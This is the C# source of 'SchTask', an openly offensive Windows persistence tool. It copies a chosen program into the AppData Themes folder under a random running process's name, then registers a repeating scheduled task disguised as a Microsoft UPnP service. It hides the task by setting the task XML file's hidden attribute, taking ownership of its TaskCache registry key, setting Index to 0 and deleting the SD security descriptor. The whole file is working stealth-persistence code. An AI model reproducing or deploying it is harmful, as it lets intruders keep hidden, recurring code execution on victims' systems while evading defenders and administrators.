using System;
using Microsoft.Win32.TaskScheduler;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;
using System.Security.AccessControl;
using CosmosKey.Utils;
using System.Security.Principal;

namespace SchTask
{
    class Program
    {
        static void Main(string[] args)
        {
            //if (args.Length == 1)
            //{
            //    string taskname = args[0];
            //    DeleteTask(taskname);
            //    return;
            //}

            if (args.Length != 2)
            {
                Banner();
                Console.WriteLine("\nUsage: SchTask.exe <File Path> <Minutes>");
                Console.WriteLine(@"   Eg: SchTask.exe C:\Windows\System32\cmd.exe 10");
                //Console.WriteLine("\nUsage: SchTask.exe <TaskName>");
                //Console.WriteLine("[!] Add the scheduled task first and then delete it");
            }
            else
            {
                Banner();
                string inputfile = args[0];
                string min = args[1];

                //选择主机随机进程名
                Process[] progresses = Process.GetProcesses();
                Random random = new Random();
                string randomname = (progresses[random.Next(progresses.Length)].ProcessName);
                if (File.Exists(inputfile))
                {
                    Copy(inputfile, randomname, min);
                    return;
                }
                Console.WriteLine("\n[x] Local file not found !");
            }
        }
        public static void Banner()
        {
            Console.WriteLine(@"  ___       _____ ____ _____");
            Console.WriteLine(@" / _ \__  _|___  |___ \___  |");
            Console.WriteLine(@"| | | \ \/ /  / /  __)|  / /");
            Console.WriteLine(@"| |_| |>  <  / /  / __/ / /     https://github.com/0x727");
            Console.WriteLine(@" \___//_/\_\/_/  |_____/_/      Author: AnonySec");
        }
        //文件复制到 %AppData%\Microsoft\Windows\Themes\ 中
        public static void Copy(string inputfile, string randomname, string min)
        {
            string appdataFile = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string sourceFile = $@"{inputfile}";
            //获取拓展名
            string extension = Path.GetExtension(sourceFile);
            string destinationFile = appdataFile + $@"\Microsoft\Windows\Themes\{randomname}" + extension;
            if (File.Exists(destinationFile))
            {
                Console.WriteLine($"\n[x] File name exists: {destinationFile}");
                return;
            }
            else
            {
                File.Copy(sourceFile, destinationFile);
                //File.Move(sourceFile, destinationFile);
                Console.WriteLine($"\n[*] Copy File location: \n{destinationFile}");
                CreateTask(randomname, destinationFile, min);
            }
        }
        //创建计划任务
        public static void CreateTask(string randomname, string destinationFile, string min)
        {
            TaskDefinition td = TaskService.Instance.NewTask();
            td.RegistrationInfo.Author = "Microsoft"; //创建者
            td.RegistrationInfo.Description = "UPnPHost Service Settings"; //描述
            //计划任务运行时间 Min/Day
            double time = double.Parse(min);
            TimeTrigger tt = new TimeTrigger();
            tt.StartBoundary = DateTime.Now;
            tt.Repetition.Interval = TimeSpan.FromMinutes(time);

            td.Triggers.Add(tt);
            td.Actions.Add(destinationFile, null, null);
            string taskpath = @"\Microsoft\Windows\UPnP\" + randomname;
            TaskService.Instance.RootFolder.RegisterTaskDefinition(taskpath, definition: td, TaskCreation.CreateOrUpdate, null, null, 0);
            HidXml(taskpath);
            RegistryKeyRule(randomname);
        }
        //隐藏 %SystemRoot%\System32\Tasks 下计划任务对应的 XML 文件
        public static void HidXml(string taskpath)
        {
            string xml = $@"C:\Windows\System32\Tasks" + taskpath;
            FileInfo info = new FileInfo(xml);
            if (info.Exists)
            {
                info.Attributes = FileAttributes.Hidden;
                Console.WriteLine($"[*] Hidden task xml file: \n{xml}");
            }
        }
        public static void RegistryKeyRule(string randomname)
        {
            string regpath = @"Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\Windows\UPnP\" + randomname;
            try
            {
                //授予Restore、Backup、TakeOwnership特权
                TokenManipulator.AddPrivilege("SeRestorePrivilege");
                TokenManipulator.AddPrivilege("SeBackupPrivilege");
                TokenManipulator.AddPrivilege("SeTakeOwnershipPrivilege");

                //更改注册表项值的所有者
                RegistryKey subKey = Registry.LocalMachine.OpenSubKey(regpath, RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.TakeOwnership);
                RegistrySecurity rs = new RegistrySecurity();
                //设置安全性的所有者为Administrators
                rs.SetOwner(new NTAccount("Administrators"));
                //为注册表项设置权限
                subKey.SetAccessControl(rs);

                //更改注册表项值的权限
                RegistryAccessRule rar = new RegistryAccessRule("Administrators", RegistryRights.FullControl, AccessControlType.Allow);
                rs.AddAccessRule(rar);
                subKey.SetAccessControl(rs);
                subKey.Close();

                RegistryKey rk = Registry.LocalMachine.OpenSubKey(regpath, true);
                //设置Index值为0，隐藏计划任务，默认值为1
                rk.SetValue("Index", 0, RegistryValueKind.DWord);
                rk.Close();

                RegeditKeyExist(regpath);

                string rkl = Registry.LocalMachine + "\\" + regpath;
                Console.WriteLine($"[*] RegistryKey location: \n{rkl}");
            }
            finally
            {
                //删除Restore、Backup、TakeOwnership特权
                TokenManipulator.RemovePrivilege("SeRestorePrivilege");
                TokenManipulator.RemovePrivilege("SeBackupPrivilege");
                TokenManipulator.RemovePrivilege("SeTakeOwnershipPrivilege");

                Console.WriteLine("\n[+] Successfully add scheduled task !");
            }
        }
        //判断SD键值是否存在（Win7 与 win2008 无SD）
        public static void RegeditKeyExist(string regpath)
        {
            string[] subkeyNames;
            RegistryKey sd = Registry.LocalMachine.OpenSubKey(regpath, true);
            subkeyNames = sd.GetValueNames();
            foreach (string keyName in subkeyNames)
            {
                if (keyName == "SD")
                {
                    sd.DeleteValue("SD");
                    sd.Close();
                    return;
                }
            }
            sd.Close();
            return;
        }
        //删除计划任务 (需要管理员权限)
        public static void DeleteTask(string taskname)
        {
            //不要写成 "\Microsoft\Windows\UPnP\" — 报错 — 找不到
            string taskpath = @"\Microsoft\Windows\UPnP";
            //获得计划任务
            TaskService ts = new TaskService();
            TaskCollection tc = ts.GetFolder(taskpath).GetTasks();
            //Console.WriteLine($"{tc}");
            if (tc.Exists(taskname))
            {
                string dtask = taskpath + "\\" + taskname;
                ts.RootFolder.DeleteTask(dtask);
                Console.WriteLine("\n[+] Successfully delete scheduled task !");
            }
            else
            {
                Console.WriteLine("\n[!] Please add scheduled task !");
            }
        }
    }
}